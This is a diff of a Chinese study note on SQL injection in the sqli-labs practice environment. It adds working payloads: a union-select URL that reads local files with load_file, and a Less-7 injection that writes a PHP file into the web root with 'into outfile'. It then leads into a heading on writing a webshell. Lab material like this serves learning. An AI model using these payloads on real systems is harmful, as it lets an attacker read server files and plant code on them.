@@ -30,18 +30,24 @@ show global variables like "secure_file_priv"
 
 ```mysql
 mysql命令行中
-select load_file("C:\\Users\\Administrator\\Desktop\\Sqli_Analysis\\sqlread_test.txt") -- 注意要用\\而不是\
+select load_file("C:\\sqlread_test.txt") -- 注意要用\\而不是\
 ```
 
 ```
-http://localhost/sqli-labs-master/Less-1/?id=0' union select 1,2,load_file("C:\\Users\\Administrator\\Desktop\\Sqli_Analysis\\sqlread_test.txt") --+
+http://localhost/sqli-labs-master/Less-1/?id=0' union select 1,2,load_file("C:\\sqlread_test.txt") --+
 ```
 
 + 写文件
 
-'<?php phpinfo();?>'探针信息？
+'<?php phpinfo();?>' -- 会返回当前的网站配置信息
 
-id=-1')) union select 1,,3 into outfile '' --+
+```
+http://localhost/sqli-labs-master/Less-7/?id=0')) union select 1,2,'<?php phpinfo();?>' into outfile 'C:\\phpStudy\\PHPTutorial\\WWW\\sqli\\Less-7\\1.php' --+
+```
+
+打开`1.php`发现
+
+![7_2](.\images\7_2.png)
 
 + 写入webshell
 
